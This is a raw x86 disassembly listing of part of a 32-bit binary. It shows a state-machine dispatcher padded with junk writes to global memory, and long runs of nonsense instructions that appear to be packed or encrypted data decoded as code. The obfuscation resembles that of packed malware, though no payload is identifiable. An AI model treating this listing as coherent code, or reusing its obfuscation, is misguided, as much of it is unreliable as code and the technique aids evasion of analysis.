  40e221:	out    0xed,eax
  40e223:	xor    DWORD PTR [edx-0x45],0x245f2e4
  40e22a:	jmp    DWORD PTR [ebx-0x6f0aefb2]
  40e230:	cmp    edx,DWORD PTR [ecx+ebp*2-0x2e]
  40e234:	fnsave [eax+0x18]
  40e237:	outs   dx,DWORD PTR ds:[esi]
  40e238:	ret    0x43a5
  40e23b:	sub    bl,BYTE PTR [ebx-0x55]
  40e23e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e23f:	inc    ecx
  40e240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e241:	(bad)  
  40e242:	push   esi
  40e243:	pop    ss
  40e244:	data16 das 
  40e246:	stos   BYTE PTR es:[edi],al
  40e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e248:	lahf   
  40e249:	call   0x43d8:0x73af9589
  40e250:	mov    fs,WORD PTR [edi+0x1858bde1]
  40e256:	shl    ebp,0x3b
  40e259:	and    al,0xf8
  40e25b:	xchg   esi,eax
  40e25c:	gs cdq 
  40e25e:	jle    0x40e2d3
  40e260:	push   0xffffffca
  40e262:	cdq    
  40e263:	aaa    
  40e264:	jno    0x40e1ea
  40e266:	leave  
  40e267:	fld    TBYTE PTR [edi+0x31]
  40e26a:	pop    esp
  40e26b:	(bad)  
  40e26c:	adc    BYTE PTR [ebx+0x23],dl
  40e26f:	mov    ebx,0x51ee1f91
  40e274:	push   edx
  40e275:	mov    DWORD PTR [ebp+0x3],ebx
  40e278:	pop    es
  40e279:	mov    al,0x52
  40e27b:	sbb    ebx,eax
  40e27d:	jae    0x40e2e7
  40e27f:	sbb    BYTE PTR [edi],al
  40e281:	pop    esi
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43381b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4337d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433753,0x43375f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4337a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4337d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4337d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433703,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433703,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433797,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433703,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4337af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43382b
  40e3da:	and    DWORD PTR ds:0x43370b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433763,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433813
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	or     bl,BYTE PTR [edi+0x2e]
  40e417:	mov    esp,0x7e7e9816
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e424
  40e421:	lds    edx,FWORD PTR [ebx-0x25]
  40e424:	xor    ebp,edx
  40e426:	mov    cl,0x93
  40e428:	xor    BYTE PTR [ebx-0x211f8646],0x1c
  40e42f:	pop    ds
  40e430:	sbb    esi,0xffffff9b
  40e433:	repz fisttp DWORD PTR [eax+0x57]
  40e437:	mov    esi,0x28b64c33
  40e43c:	xor    bh,ch
  40e43e:	push   0x5832002c
  40e443:	sbb    edi,DWORD PTR [edi+0x420eb774]
  40e449:	push   eax
  40e44a:	cmp    BYTE PTR [ecx-0x32c5c7b4],ch
  40e450:	test   eax,0xd9be9076
  40e455:	idiv   BYTE PTR [edx+0x3295d5d]
  40e45b:	sub    cx,ax
  40e45e:	cmp    eax,0xd9455835
  40e463:	inc    edi
  40e464:	push   esi
  40e465:	ror    BYTE PTR [esi],0xa
  40e468:	mov    BYTE PTR [edi+0x5],0x5d
  40e46c:	mov    ebx,DWORD PTR [esi]
  40e46e:	sbb    dl,BYTE PTR [edi]
  40e470:	test   al,0x63
  40e472:	daa    
  40e473:	or     BYTE PTR [ecx+0x289fa20d],cl
  40e479:	pop    ds
  40e47a:	icebp  
  40e47b:	cmc    
  40e47c:	xor    DWORD PTR [edx+ebx*1-0x5d],esi
  40e480:	pop    ss
  40e481:	pop    ds
  40e482:	adc    al,0x35
  40e484:	sbb    al,0x51
  40e486:	mov    eax,0xfde4e4e5
  40e48b:	dec    edi
  40e48c:	sub    eax,0x57
  40e48f:	dec    ecx
  40e490:	mov    ebp,DWORD PTR [eax+0x5b]
  40e493:	out    dx,eax
  40e494:	sub    dh,BYTE PTR ds:[eax-0x1e]
  40e498:	jae    0x40e4b7
  40e49a:	mov    bl,0xd9
  40e49c:	add    DWORD PTR [esi],esi
  40e49e:	pop    ebx
  40e49f:	ret    0xdedd
  40e4a2:	scas   al,BYTE PTR es:[edi]
  40e4a3:	dec    esi
  40e4a4:	cs inc ebp
  40e4a6:	and    DWORD PTR ds:0x6cafbc41,0x5d2b119e
  40e4b0:	popf   
  40e4b1:	out    0xe4,eax
  40e4b3:	sub    BYTE PTR [eax+0x1e2352a7],al
  40e4b9:	dec    esi
  40e4ba:	xor    al,0x52
  40e4bc:	cmp    BYTE PTR [esi+eax*1+0x1d6a1568],cl
  40e4c3:	bound  ebp,QWORD PTR [ebx+0x4e]
  40e4c6:	push   0x7d8d7746
  40e4cb:	scas   al,BYTE PTR es:[edi]
  40e4cc:	mov    bl,BYTE PTR [edi]
  40e4ce:	pop    eax
  40e4cf:	pusha  
  40e4d0:	out    dx,al
  40e4d1:	lea    edx,[ecx]
  40e4d3:	or     ah,BYTE PTR [ebx]
  40e4d5:	sub    DWORD PTR [edx],esp
  40e4d7:	call   0x5c86:0x26e4310d
  40e4de:	mov    al,ds:0x49bea4de
  40e4e3:	in     al,dx
  40e4e4:	xchg   ebp,eax
  40e4e5:	mov    ch,0xa
  40e4e7:	jmp    0x48b:0x1ca58611
  40e4ee:	sub    al,dl
  40e4f0:	mov    cl,0xf7
  40e4f2:	dec    eax
  40e4f3:	scas   al,BYTE PTR es:[edi]
  40e4f4:	mov    ds:0xc2cdbe51,eax
  40e4f9:	pop    eax
  40e4fa:	mov    eax,0xf48f8eff
  40e4ff:	mov    ah,0x59
  40e501:	add    ecx,esi
  40e503:	adc    al,0x7d
  40e505:	and    BYTE PTR [edx-0x8],bh
  40e508:	and    DWORD PTR [ebx+0xd],edi
  40e50b:	call   0xec840d59
  40e510:	jle    0x40e49e
  40e512:	mov    edx,es
  40e514:	sbb    bh,0x78
  40e517:	sbb    ecx,DWORD PTR [edx-0x12dc208b]
  40e51d:	sub    ebx,DWORD PTR [eax+0x754d8122]
  40e523:	or     al,0x19
  40e525:	hlt    
  40e526:	mov    dl,0xa7
  40e528:	test   BYTE PTR [edx+0x39f9b889],bl
  40e52e:	fstp   QWORD PTR [ebx-0x21]
  40e531:	inc    eax
  40e532:	jle    0x40e554
  40e534:	test   al,0x29
  40e536:	pop    eax
  40e537:	mov    eax,ds:0x4f1c3b61
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x4337a3,0x4337eb
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x8ef261b8
  40e5b4:	sub    edi,DWORD PTR [edi+0x7e992a67]
  40e5ba:	jle    0x40e5ce
  40e5bc:	jg     0x40e63c
  40e5be:	jle    0x40e594
  40e5c0:	aas    
  40e5c1:	jle    0x40e5c8
  40e5c3:	mov    bl,0x4c
  40e5c5:	mov    bh,0xbe
  40e5c7:	cmp    al,0xaa
  40e5c9:	in     al,0x72
  40e5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5cc:	inc    eax
  40e5cd:	les    edi,FWORD PTR [eax+0x3a65a19c]
  40e5d3:	fwait
  40e5d4:	sub    eax,0x4495fce
  40e5d9:	jg     0x40e563
  40e5db:	mov    dh,0x5f
  40e5dd:	retf   0x2337
  40e5e0:	xchg   ecx,eax
  40e5e1:	(bad)  
  40e5e2:	cs add eax,0x50730e8
  40e5e8:	xchg   ebp,eax
  40e5e9:	pop    ebp
  40e5ea:	pusha  
  40e5eb:	add    BYTE PTR [ebx],cl
  40e5ed:	dec    esp
  40e5ee:	int3   
  40e5ef:	(bad)  
  40e5f0:	in     al,0x6e
  40e5f2:	sbb    esp,edi
  40e5f4:	mov    edi,0x56dc11cb
  40e5f9:	jl     0x40e5f1
  40e5fb:	js     0x40e5a1
  40e5fd:	imul   esp,edi,0x8ec7e5d0
  40e603:	std    
  40e604:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40e606:	sbb    ch,bl
  40e608:	or     al,dh
  40e60a:	outs   dx,BYTE PTR ds:[esi]
  40e60b:	mov    ch,0x1e
  40e60d:	jno    0x40e64a
  40e60f:	cmp    BYTE PTR [ebp+0x45fa70d],0xe4
  40e616:	xor    al,0x7f
  40e618:	out    dx,al
  40e619:	adc    al,0xbc
  40e61b:	and    eax,0x7f780cf1
  40e620:	inc    esp
  40e621:	sti    
  40e622:	mov    DWORD PTR [eax-0x4353aef7],edx
  40e628:	es loopne 0x40e6a0
  40e62b:	clc    
  40e62c:	popf   
  40e62d:	aaa    
  40e62e:	jbe    0x40e5d9
  40e630:	inc    esi
  40e631:	fidivr DWORD PTR [edx-0x3ffed416]
  40e637:	push   ecx
  40e638:	sub    ebp,ecx
  40e63a:	add    eax,eax
  40e63c:	mov    ebp,eax
  40e63e:	iret   
  40e63f:	mov    bh,0x97
  40e641:	fwait
  40e642:	icebp  
  40e643:	inc    eax
  40e644:	mov    ch,0xbf
  40e646:	mov    ds:0x1769f86e,eax
  40e64b:	rol    edi,1
  40e64d:	das    
  40e64e:	pop    edi
  40e64f:	push   cs
  40e650:	addr16 jb 0x40e6ca
  40e653:	mov    esi,0x64a77c41
  40e658:	fs (bad) 
  40e65b:	fnstsw WORD PTR [ebp+0x5d035847]
  40e661:	dec    edx
  40e662:	je     0x40e694
  40e664:	lds    edx,FWORD PTR [eax+0x7653dec6]
  40e66a:	test   al,0x74
  40e66c:	or     eax,0x1b3f92a0
  40e671:	ins    DWORD PTR es:[edi],dx
  40e672:	ss ins DWORD PTR es:[edi],dx
  40e674:	out    dx,eax
  40e675:	sbb    cl,bl
  40e677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e678:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e67b:	cs xchg esi,eax
  40e67d:	mov    bl,BYTE PTR [esi]
  40e67f:	fcmovnu st,st(4)
  40e681:	cld    
  40e682:	scas   eax,DWORD PTR es:[edi]
  40e683:	dec    edx
  40e684:	(bad)  
  40e685:	push   ds
  40e686:	test   DWORD PTR ds:0x7e4c2ab5,0xafed769d
  40e690:	mov    dl,0xb1
  40e692:	lds    ebx,FWORD PTR [ebx-0x27959b58]
  40e698:	fiadd  WORD PTR [ecx]
  40e69a:	sub    DWORD PTR ds:0xc0f09cfb,0x31ebe557
  40e6a4:	xchg   ebp,eax
  40e6a5:	mov    ch,0x84
  40e6a7:	std    
  40e6a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a9:	ins    BYTE PTR es:[edi],dx
  40e6aa:	sbb    eax,0x5dc2764d
  40e6af:	or     edx,DWORD PTR [esi+esi*2-0x7d]
  40e6b3:	push   esi
  40e6b4:	cmp    eax,0xc7ec4eb1
  40e6b9:	out    0xa2,al
  40e6bb:	cdq    
  40e6bc:	ds dec esp
  40e6be:	mov    ?,WORD PTR [ebx+0x6b40102f]
  40e6c4:	mov    ebp,0xc878ec1b
  40e6c9:	gs cmp ebp,ecx
  40e6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6cd:	adc    al,0xb5
  40e6cf:	scas   al,BYTE PTR es:[edi]
  40e6d0:	jge    0x40e6f1
  40e6d2:	in     eax,dx
  40e6d3:	sub    ch,BYTE PTR [eax]
  40e6d5:	lods   al,BYTE PTR ds:[esi]
  40e6d6:	int    0x9d
  40e6d8:	or     BYTE PTR [edi-0x78],dl
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x7fc5c41f]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e77f
  40e704:	lods   al,BYTE PTR ds:[esi]
  40e705:	ins    DWORD PTR es:[edi],dx
  40e706:	xor    ch,BYTE PTR [esi]
  40e708:	rcl    BYTE PTR [eax-0x21],0x9b
  40e70c:	(bad)  
  40e70d:	and    esp,edx
  40e70f:	shr    BYTE PTR [ebp+0x1b],cl
  40e712:	lea    edi,[edx]
  40e714:	dec    edi
  40e715:	aam    0x46
  40e717:	mov    ch,0xea
  40e719:	mov    edi,DWORD PTR [ebx+0x501b2b4a]
  40e71f:	or     BYTE PTR [esi-0x80],ah
  40e722:	sub    ah,0x73
  40e725:	(bad)  
  40e726:	cmp    al,0xff
  40e728:	fdivr  DWORD PTR [ebx+0x71]
  40e72b:	aaa    
  40e72c:	test   al,0x6c
  40e72e:	mov    al,0x51
  40e730:	xchg   esp,eax
  40e731:	mov    edi,0x153ea2a3
  40e736:	in     eax,dx
  40e737:	test   al,0x53
  40e739:	cmp    al,0xd8
  40e73b:	fidivr WORD PTR [esp+esi*2-0x2a506b8c]
  40e742:	pop    esp
  40e743:	pop    esi
  40e744:	or     DWORD PTR [ecx-0x757b06ec],ecx
  40e74a:	xchg   esi,ebx
  40e74c:	int3   
  40e74d:	(bad)  
  40e74e:	std    
  40e74f:	cli    
  40e750:	repz dec edi
  40e752:	jmp    0x3c3c:0xed13666
  40e759:	rol    DWORD PTR [ebx-0x34],1
  40e75c:	call   0xc9b3:0x213a840a
  40e763:	int3   
  40e764:	or     al,0xee
  40e766:	xor    cl,BYTE PTR [edx+0x50]
  40e769:	retf   
  40e76a:	shl    DWORD PTR [edx],1
  40e76c:	ins    DWORD PTR es:[edi],dx
  40e76d:	fwait
  40e76e:	mov    edx,0x8c6e2831
  40e773:	(bad)  
  40e774:	popa   
  40e775:	xchg   ebp,eax
  40e776:	clc    
  40e777:	mov    dh,0x8c
  40e779:	xor    BYTE PTR [eax+0x30],ah
  40e77c:	inc    edx
  40e77d:	cmp    ch,BYTE PTR [ebx]
  40e77f:	stos   DWORD PTR es:[edi],eax
  40e780:	sub    eax,DWORD PTR [esi]
  40e782:	xor    esi,esi
  40e784:	aam    0x90
  40e786:	outs   dx,BYTE PTR ds:[esi]
  40e787:	fxch   st(7)
  40e789:	sbb    dl,BYTE PTR [ecx+ebp*2-0x2e]
  40e78d:	pop    ecx
  40e78e:	mov    dh,0x5f
  40e790:	in     eax,dx
  40e791:	imul   edx,esi,0xffffffec
  40e794:	and    eax,0xd785d2a7
  40e799:	jns    0x40e7bb
  40e79b:	and    eax,0x35656463
  40e7a0:	cmp    al,0xa0
  40e7a2:	je     0x40e754
  40e7a4:	mov    bh,0x8e
  40e7a6:	shl    BYTE PTR [ebx],0x52
  40e7a9:	daa    
  40e7aa:	mov    esi,0xcaad60b
  40e7af:	aad    0x62
  40e7b1:	sub    cl,BYTE PTR [ebx-0x7f280aa]
  40e7b7:	inc    ebx
  40e7b8:	enter  0x434e,0xf
  40e7bc:	outs   dx,BYTE PTR ds:[esi]
  40e7bd:	xor    ah,BYTE PTR [edx-0x3eb0d36f]
  40e7c3:	je     0x40e827
  40e7c5:	dec    esp
  40e7c6:	mov    WORD PTR [eax],es
  40e7c8:	mov    dl,0xc6
  40e7ca:	mov    edx,0x38359b84
  40e7cf:	into   
  40e7d0:	imul   eax,DWORD PTR [ebx],0xffffff89
  40e7d3:	sub    eax,0x22d40d87
  40e7d8:	inc    edi
  40e7d9:	add    al,0xe
  40e7db:	dec    edi
  40e7dc:	imul   edx,DWORD PTR [edi],0x3d5b06e1
  40e7e2:	(bad)  
  40e7e3:	jge    0x40e794
  40e7e5:	and    al,0x0
  40e7e7:	inc    ecx
  40e7e8:	cmc    
  40e7e9:	bound  ebp,QWORD PTR [edi-0x36]
  40e7ec:	pop    eax
  40e7ed:	fmul   st(6),st
  40e7ef:	adc    edi,ebp
  40e7f1:	jbe    0x40e84e
  40e7f3:	mov    ds:0xe7dfbc55,eax
  40e7f8:	pop    ebx
  40e7f9:	mov    ah,0xf5
  40e7fb:	out    dx,al
  40e7fc:	adc    ebx,DWORD PTR [ecx]
  40e7fe:	dec    esp
  40e7ff:	mov    ebx,0xded44bd7
  40e804:	add    bh,dh
  40e806:	adc    BYTE PTR [edx-0x4c],dh
  40e809:	and    eax,0x5ac09792
  40e80e:	xor    BYTE PTR [ebx-0x12ff6331],dh
  40e814:	mov    ?,eax
  40e816:	cmp    BYTE PTR [eax+0x62e93004],ch
  40e81c:	test   eax,0x4589d47c
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e883
  40e854:	or     DWORD PTR [edi+0x15],eax
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8a1
  40e860:	fadd   DWORD PTR [edx-0x1b]
  40e863:	dec    ecx
  40e864:	pop    esi
  40e865:	jne    0x40e830
  40e867:	xchg   ecx,eax
  40e868:	xchg   al,dh
  40e86a:	jmp    0xcb42517a
  40e86f:	pop    edi
  40e870:	aam    0xb4
  40e872:	out    0x17,eax
  40e874:	sahf   
  40e875:	test   eax,0xd7b2124e
  40e87a:	ficomp DWORD PTR [edx+ecx*1]
  40e87d:	cmp    eax,0xca2a45e9
  40e882:	cdq    
  40e883:	push   0xffffff86
  40e885:	cmp    eax,0xa227ca44
  40e88a:	adc    bl,0xd8
  40e88d:	mov    bh,0x6c
  40e88f:	and    bh,BYTE PTR [edi+0x4d]
  40e892:	and    ebx,ecx
  40e894:	cmp    dl,BYTE PTR [eax-0x2]
  40e897:	push   eax
  40e898:	mov    ebp,0x95ffd55d
  40e89d:	dec    esi
  40e89e:	(bad)  
  40e89f:	pop    eax
  40e8a0:	and    BYTE PTR [edx+eiz*4-0x1019bc64],dh
  40e8a7:	jmp    0xa79bd3a1
  40e8ac:	out    0x5d,al
  40e8ae:	add    edi,DWORD PTR ds:0xec9319a5
  40e8b4:	stc    
  40e8b5:	add    al,0x3
  40e8b7:	inc    ebx
  40e8b8:	aas    
  40e8b9:	cmp    eax,0xc7c5d019
  40e8be:	shl    DWORD PTR [eax-0x17870328],1
  40e8c4:	cmp    eax,0x3fb6742e
  40e8c9:	(bad)  
  40e8ca:	shr    BYTE PTR [esi+ebx*8],cl
  40e8cd:	leave  
  40e8ce:	repnz inc esi
  40e8d0:	xchg   ecx,eax
  40e8d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d2:	ins    BYTE PTR es:[edi],dx
  40e8d3:	adc    eax,0xb617e579
  40e8d8:	pop    ebp
  40e8d9:	and    eax,0xb2dbbf9c
  40e8de:	addr16 nop
  40e8e0:	lds    ecx,FWORD PTR [edx]
  40e8e2:	adc    DWORD PTR [ebp-0x3b73292c],0x64fd2c98
  40e8ec:	sub    eax,0x5e1e119d
  40e8f1:	push   esp
  40e8f2:	or     ebp,DWORD PTR [ebx+0x40]
  40e8f5:	cwde   
  40e8f6:	fist   WORD PTR [edx+0x35]
  40e8f9:	adc    eax,DWORD PTR [eax+0x28]
  40e8fc:	rcr    DWORD PTR [edx-0x198ef41e],0x7
  40e903:	sub    al,BYTE PTR [edi]
  40e905:	inc    esi
  40e906:	push   ecx
  40e907:	mov    ebx,ecx
  40e909:	scas   eax,DWORD PTR es:[edi]
  40e90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e90b:	ins    BYTE PTR es:[edi],dx
  40e90c:	xor    DWORD PTR [ecx],esi
  40e90e:	dec    ebx
  40e90f:	mov    ch,0xb5
  40e911:	sub    dh,bl
  40e913:	add    ecx,DWORD PTR [esi-0x12]
  40e916:	pop    esp
  40e917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e918:	mov    ebx,0x32bda85f
  40e91d:	pop    ecx
  40e91e:	mov    WORD PTR [esp+ecx*8-0xc104488],gs
  40e925:	in     al,0xa3
  40e927:	jb     0x40e97b
  40e929:	cmp    DWORD PTR [ecx],esi
  40e92b:	mov    ecx,0xec33c53d
  40e930:	das    
  40e931:	xchg   ebx,eax
  40e932:	xlat   BYTE PTR ds:[ebx]
  40e933:	mov    WORD PTR [edx*1+0x34af0fcc],?
  40e93a:	dec    edx
  40e93b:	add    al,0x42
  40e93d:	out    dx,al
  40e93e:	xchg   ecx,eax
  40e93f:	lods   eax,DWORD PTR ds:[esi]
  40e940:	or     BYTE PTR [esi],bl
  40e942:	pop    edi
  40e943:	aas    
  40e944:	out    0x17,eax
  40e946:	mov    dl,0x76
  40e948:	mov    al,ds:0x4a54b7fe
  40e94d:	or     edx,eax
  40e94f:	mov    bl,0x19
  40e951:	or     DWORD PTR [ebx],ecx
  40e953:	add    cl,BYTE PTR [edi]
  40e955:	daa    
  40e956:	or     eax,DWORD PTR [esi-0x4a]
  40e959:	adc    eax,0x53742411
  40e95e:	mov    BYTE PTR [edi-0x4857346e],al
  40e964:	sub    DWORD PTR [esi],edi
  40e966:	test   eax,0x98576a30
  40e96b:	int3   
  40e96c:	xor    eax,0xc96de40b
  40e971:	cmc    
  40e972:	jne    0x40e98e
  40e974:	adc    DWORD PTR [esi+0x205ff91],ebx
  40e97a:	jne    0xe2bd
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x24d1011d
  40e99c:	mov    bh,0x86
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40ea02
  40e9a6:	pushf  
  40e9a7:	push   cs
  40e9a8:	std    
  40e9a9:	dec    ecx
  40e9aa:	pop    edx
  40e9ab:	jne    0x40e9ac
  40e9ad:	sbb    ecx,DWORD PTR [ebx-0x1c]
  40e9b0:	jecxz  0x40e939
  40e9b2:	scas   al,BYTE PTR es:[edi]
  40e9b3:	hlt    
  40e9b4:	lock xor al,0x96
  40e9b7:	call   ebx
  40e9b9:	lahf   
  40e9ba:	out    dx,eax
  40e9bb:	xor    ebp,DWORD PTR [ecx+eiz*2-0x3034de79]
  40e9c2:	call   0x97d3:0x537f2d50
  40e9c9:	out    dx,eax
  40e9ca:	pop    esp
  40e9cb:	je     0x40e982
  40e9cd:	push   es
  40e9ce:	arpl   dx,ax
  40e9d0:	lds    ecx,FWORD PTR [eax]
  40e9d2:	pop    ebp
  40e9d3:	sub    edi,DWORD PTR [edi]
  40e9d5:	pop    es
  40e9d6:	sbb    BYTE PTR [ebx],ch
  40e9d8:	ror    DWORD PTR [edx],cl
  40e9da:	retf   
  40e9db:	(bad)  
  40e9dc:	jge    0x40e9cd
  40e9de:	mov    ds:0x42ba49a3,al
  40e9e3:	and    edx,DWORD PTR [edx]
  40e9e5:	mov    al,cs:0x555e9311
  40e9eb:	lds    esp,FWORD PTR [ebp-0x33927ec1]
  40e9f1:	fistp  WORD PTR [edi]
  40e9f3:	jecxz  0x40ea32
  40e9f5:	das    
  40e9f6:	scas   eax,DWORD PTR es:[edi]
  40e9f7:	mov    esp,ebp
  40e9f9:	push   es
  40e9fa:	mov    eax,0xa850bb0f
  40e9ff:	out    0xe2,al
  40ea01:	dec    ecx
  40ea02:	cs inc ebx
  40ea04:	push   edi
  40ea05:	dec    esp
  40ea06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea07:	xor    al,0x6c
  40ea09:	xchg   edx,eax
  40ea0a:	sar    BYTE PTR [ebx-0x372c78da],0xb6
  40ea11:	pop    ecx
  40ea12:	adc    ch,BYTE PTR [ebx+0x5d]
  40ea15:	mov    esi,0x55fa9a33
  40ea1a:	out    0xa9,eax
  40ea1c:	outs   dx,DWORD PTR ds:[esi]
  40ea1d:	hlt    
  40ea1e:	lds    ecx,FWORD PTR [edx+0x65]
  40ea21:	pop    ebp
  40ea22:	fs lock fistp DWORD PTR fs:[eax+0x14]
  40ea28:	daa    
  40ea29:	and    ah,BYTE PTR [edx]
  40ea2b:	and    esp,ebx
  40ea2d:	lds    eax,FWORD PTR [esp+edx*2]
  40ea30:	hlt    
  40ea31:	sti    
  40ea32:	sbb    al,0x2a
  40ea34:	mov    BYTE PTR fs:[eax+0x449f13ac],ah
  40ea3b:	in     al,0xa7
  40ea3d:	rcl    DWORD PTR [esp+ebp*8],1
  40ea40:	outs   dx,DWORD PTR ds:[esi]
  40ea41:	test   BYTE PTR [ecx+0x1a],0xa8
  40ea45:	push   cs
